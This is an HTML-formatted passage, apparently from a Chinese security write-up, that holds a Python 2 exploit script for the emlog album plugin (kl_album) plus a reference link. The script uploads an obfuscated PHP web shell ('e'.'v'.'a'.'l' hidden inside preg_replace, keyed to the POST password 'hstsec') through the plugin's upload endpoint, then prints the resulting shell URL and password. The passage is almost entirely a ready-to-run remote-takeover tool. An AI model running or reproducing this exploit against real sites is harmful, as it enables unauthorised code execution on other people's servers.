class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">except ImportError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise SystemExit(&#39;\n[!] requests</span><span class="cs7FFD2630">模块导入错误</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">请执行</span><span class="cs9FB05234">pip install requests</span><span class="cs7FFD2630">安装</span><span class="cs9FB05234">!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def usage():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# os.system([&#39;clear&#39;, &#39;cls&#39;][os.name == &#39;nt&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;+&#39; + &#39;-&#39; * 60 + &#39;+&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;\t Python emlog</span><span class="cs7FFD2630">相册插件</span><span class="cs9FB05234">getshell exploit&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;\t &nbsp;&nbsp;Blog</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://www.waitalone.cn/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;\t\t Code BY</span><span class="cs7FFD2630">：</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">独自等待</span><span class="cs9FB05234">&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;\t\t Time</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">2015-04-30&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;+&#39; + &#39;-&#39; * 60 + &#39;+&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) != 2:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;</span><span class="cs7FFD2630">用法</span><span class="cs9FB05234">: &#39; + os.path.basename(sys.argv[0]) + &#39; EMLOG </span><span class="cs7FFD2630">网站地址</span><span class="cs9FB05234">&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;</span><span class="cs7FFD2630">实例</span><span class="cs9FB05234">: &#39; + os.path.basename(sys.argv[0]) + &#39; http://www.waitalone.cn/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def getshell(url):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;emlog</span><span class="cs7FFD2630">相册插件上传</span><span class="cs9FB05234">getshell</span><span class="cs7FFD2630">函数</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;:param url: &nbsp;emlog url</span><span class="cs7FFD2630">地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;:return: &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回得到的</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;up_url = url + &#39;content/plugins/kl_album/kl_album_ajax_do.php&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;shell = &quot;&lt;?php @preg_replace(&#39;\\&#39;a\\&#39;eis&#39;,&#39;e&#39;.&#39;v&#39;.&#39;a&#39;.&#39;l&#39;.&#39;($_POST[\&quot;hstsec\&quot;])&#39;,&#39;a&#39;);?&gt;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filename = &quot;oneok&#39;.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;with open(filename, &#39;wb&#39;) as shellok:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellok.write(shell)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;files = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Filedata&#39;: (filename, open(filename, &#39;rb&#39;), &#39;text/json&#39;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;album&#39;: (None, &#39;waitalone.cn&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;up_res = requests.post(up_url, files=files).content</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellok = re.findall(re.compile(r&#39;(?&lt;=\.\./).+?(?=\&#39;,)&#39;), up_res)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception, msg:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;\n[x] </span><span class="cs7FFD2630">发生错误了</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">卧槽</span><span class="cs9FB05234">!!!:&#39;, msg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if shellok: return url + shellok[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;usage()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;start = time.time()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if url[-1] != &#39;/&#39;: url += &#39;/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ok = getshell(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.remove(&#39;oneok\&#39;.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;\n[x] </span><span class="cs7FFD2630">删除临时文件失败</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">请手工删除</span><span class="cs9FB05234">!&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ok:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;\n[!] </span><span class="cs7FFD2630">爷</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">人品暴发了，成功得到</span><span class="cs9FB05234">Shell</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\n\n%s </span><span class="cs7FFD2630">密码：</span><span class="cs9FB05234">%s&#39; % (ok, &#39;hstsec&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;\n[x] </span><span class="cs7FFD2630">报告大爷</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">本站不存在此漏洞</span><span class="cs9FB05234">!&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;\n</span><span class="cs7FFD2630">报告爷</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">脚本执行完毕</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">用时</span><span class="cs9FB05234">:&#39;, time.time() - start, &#39;</span><span class="cs7FFD2630">秒</span><span class="cs9FB05234">!&#39;</span></p><h2 class="cs868C439D">
			<a name="四参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://blog.csdn.net/Fly_hps/article/details/80582751</span></p></body>
</html>
